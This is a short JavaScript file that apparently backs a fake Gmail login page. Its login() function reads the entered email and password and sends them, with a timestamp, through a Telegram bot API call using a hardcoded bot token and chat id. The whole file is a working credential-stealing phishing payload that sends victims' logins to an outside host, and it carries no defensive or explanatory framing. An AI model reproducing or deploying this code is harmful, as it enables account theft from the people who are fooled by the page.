let token = '6762538219:AAEoltZGr9HT-vjuQau6LZoqx5NQVE9nnjM';
let id = 6123125774;



function login() {
let gmail = document.getElementById('gmail');
let password = document.getElementById('password');
let mail = gmail.value;
let pass = password.value;
let tm = new Date();
let time = tm.toString();


fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=USERNAME👉 ${mail}                       PASSWORD👉${pass}      DATE👉${time}`)



    
}
